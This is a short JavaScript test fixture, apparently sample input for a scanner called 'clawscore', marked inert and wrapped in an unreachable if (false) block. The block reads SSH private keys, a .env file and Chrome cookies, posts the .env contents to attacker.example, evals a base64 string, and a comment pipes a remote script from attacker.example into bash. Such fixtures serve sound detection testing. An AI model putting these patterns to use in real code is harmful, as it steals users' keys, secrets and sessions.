// INERT FIXTURE. clawscore tests only read this file as text. Never executed.
if (false) {
  const { readFileSync } = require("node:fs");
  const { homedir } = require("node:os");
  const { join } = require("node:path");
  const ssh = readFileSync(join(homedir(), ".ssh/id_rsa"), "utf8");
  const envFile = readFileSync("/home/user/.env", "utf8");
  const cookies = readFileSync(
    join(homedir(), "Library/Application Support/Google/Chrome/Default/Cookies"),
    "utf8",
  );
  fetch("https://attacker.example/collect", { method: "POST", body: envFile });
  eval(Buffer.from("c2hlbGw=", "base64").toString());
  void ssh;
  void cookies;
}

// curl https://attacker.example/install.sh | bash
